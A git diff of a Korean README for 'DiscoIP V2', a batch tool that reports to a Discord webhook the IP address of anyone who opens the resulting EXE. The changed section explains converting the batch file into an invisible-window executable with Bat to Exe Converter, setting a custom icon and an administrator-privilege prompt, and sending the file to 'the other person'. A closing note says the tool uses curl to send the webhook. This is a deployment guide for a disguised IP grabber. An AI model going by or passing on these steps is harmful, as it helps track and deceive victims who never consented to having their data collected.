@@ -15,6 +15,7 @@ DiscoIP는 상대가 EXE 파일을 열면 상대의 아이피가 디스코드 �
 <br/><br/>
 기본파일 설정 -> 기본파일을 EXE 파일로 위장 -> EXE 파일 배포
 <br/><br/>
+
 ## 1단계 : 편집화면으로 가기<br/><br/>
 
 DiscoIP V2.bat 을 우클릭 > 편집으로 가주세요  <br/><br/>
@@ -52,15 +53,14 @@ SET Provide_additional_information=TRUE
 ## 3단계 : 기본 파일을 EXE로 <br/><br/>
 [Bat to exe Converter](https://en.softonic.com/download/bat-to-exe-converter-x64/windows/post-download)
 를 다운로드 하고 열어주세요.<br/>
-메뉴바의 Open 버튼 누르고 세팅한 기본 파일 선택<br/>
-오른쪽에 Exe-Format 에서 "64 BitㅣWindows (Invisible)" 아니면 "32 BitㅣWindows (Invisible)"선택 <br/>
-선택사항들<br/>
-Icon : 배포파일 아이콘 지정<br/>
-UAC : 배포파일을 열떄 관리자 권한 요구<br/>
-메뉴에서 Convert 눌르고 배포파일 이름 정하기<br/>
-이러면 배포파일이 생성됩니다!<br/>
-배포파일을 상대방에게 보내보세요!
-
+메뉴바의 Open 버튼 누르고 설정한 기본 파일 선택<br/>
+오른쪽에 Option 에서 Exe-Format 에서 "64 BitㅣWindows (Invisible)" 아니면 "32 BitㅣWindows (Invisible)"선택 <br/>
+Option에는 많은 옵션들이 있습니다.주요 옵션에 이것들이 있습니다.<br>
+* ICON : EXE 파일 아이콘 설정
+* UAC : EXE 파일을 사용하기 위해 사용자권한, 관리자권한 요구<br/>
+Version Information 에선 EXE 파일 버전을 자세히 편집할 수 있습니다(필수아님)<br/>
+다 설정하셨다면  Convert 를 눌르고 EXE 파일 이름을 입력하고 저장하면 EXE 파일이 생성됩니다.<br/>
+EXE 파일을 상대에게 보내보세요!
 </details>
 <details markdown="1">
 <summary>주의사항</summary>
@@ -68,6 +68,7 @@ UAC : 배포파일을 열떄 관리자 권한 요구<br/>
 - **세팅만 해주시고 그 외의 코드를 삽입해주지 말아주세요(중요)**<br/>
 사용자가 바이러스로 개조할 가능성이 있습니다.
 제발 하지 말아주세요!<br/>
+
 - **DiscoIP는 Curl 라이브러리를 사용하기 떄문에 사용자의 컴퓨터에 Curl 이 다운되어 있지 않으면 웹훅크를 보낼 수 없습니다**<br/>
 대부분 컴퓨터는 Curl 이 기본적으로 다운되어 있지만 일부 컴퓨터는 다운되어 있지 않을 수 있습니다<br/>
 [CURL ](https://curl.se/)
